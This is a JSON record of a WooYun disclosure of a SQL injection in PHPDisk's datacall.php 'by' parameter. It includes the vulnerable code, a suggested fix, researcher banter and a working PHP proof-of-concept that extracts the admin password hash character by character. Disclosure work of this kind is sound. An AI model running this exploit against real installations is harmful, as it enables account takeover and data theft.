{"id": 65158, "wybug_id": "wooyun-2012-015410", "wybug_title": "躺在床上读代码之 phpdick SQL注射", "wybug_corp": "phpdisk.com", "wybug_author": "快点啊！！", "wybug_date": "2012-11-29 16:10", "wybug_open_date": "2012-12-04 16:10", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "12", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-11-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-12-04：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 一个漏洞都没有被确认，那我还是都看看wooyun有注册的厂商的代码吧。 详细说明：  在phpdisk/api/datacall.php中有一段代码：\n$order = trim(gpc('order','G',''));$by = trim(gpc('by','G',''));$limit = (int)gpc('limit','G',0);if(!$type || !$order || !$by || !$limit){\techo 'PHPDisk Datacall Parameter is null or Error!';\texit;}$filter_arr = array('select','delete','update','insert');for($i=0;$i<count($filter_arr);$i++){  if(strpos($order,strtolower($filter_arr[$i]))!==false){    die('PHPDisk Datacall Parameter Error!');  }}if($type=='user'){\techo '<ul>'.LF;\t$q = $db->query(\"select username,userid from {$tpf}users order by $order $by limit $limit\");\n$order和$by进入了query查询，看的出来作者想到了可能会有人在order里提交query，但是他没想到在不提交order，在by里提交一样可以注射。   漏洞证明：  \n\n\n<?php$file = 'http://localhost/phpdisk/api/datacall.php';for($i=0;$i<32;$i++) {\t$path = $i+1;\tforeach(array('a','b','c','d','e','f',0,1,2,3,4,5,6,7,8,9) as $w) {\t\t$api = $file.'?type=user&by='.urlencode('(if(((select substring(password,'.$path.',1) from pd_users where userid=1)=0x'.bin2hex($w).'),userid,username))').'&order=/**/&limit=1';\t\tif(strpos(file_get_contents($api),'admin')!==false) {\t\t\techo $w;\t\t\tbreak;\t\t}\t}\t}//http://localhost/phpdisk/api/datacall.php?type=user&by=if%28%28%28select%201%20from%20pd_users%20where%20userid=1%20limit%201%29=2%29,userid,username%29&order=/**/&limit=1?>\n   修复方案：  只允许a-z的order和by   版权声明：转载请注明来源 快点啊！！@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2012-12-04 16:10 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-11-29 16:15 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  @快点啊！！ 你都躺了整整一周了    \n     2012-11-29 16:17 |    \t\tRookie \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:78        | 123)\t\t \n  啥时候起床啊    \n     2012-11-29 20:17 |    \t\tpopok \t\t\t( 普通白帽子  |\t\t\t        Rank:117 漏洞数:24        | nothing)\t\t \n  半身不遂植物人大神V587    \n     2012-11-30 00:35 |    \t\t0ps \t\t\t( 实习白帽子  |\t\t\t        Rank:43 漏洞数:10        | xo)\t\t \n  @popok 哈哈。亮了    \n     2012-11-30 11:22 |    \t\tz@cx \t\t\t( 普通白帽子  |\t\t\t        Rank:434 漏洞数:56        | 。-。-。)\t\t \n  phpdisk主站有个root权限的sql注射。。。    \n     2012-11-30 12:13 |    \t\tRay \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:7        )\t\t \n  @z@cx 报到wooyun上啊。    \n     2012-12-04 16:22 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  “开源产品在走下坡路”，洞主的签名让多少从业者闻者伤心，听者流泪...    \n     2012-12-04 18:38 |    \t\tmOon \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 上线非本人，请勿打扰！)\t\t \n  半身不遂植物人大神 求交流     \n     2012-12-05 10:26 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  哈哈哈    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}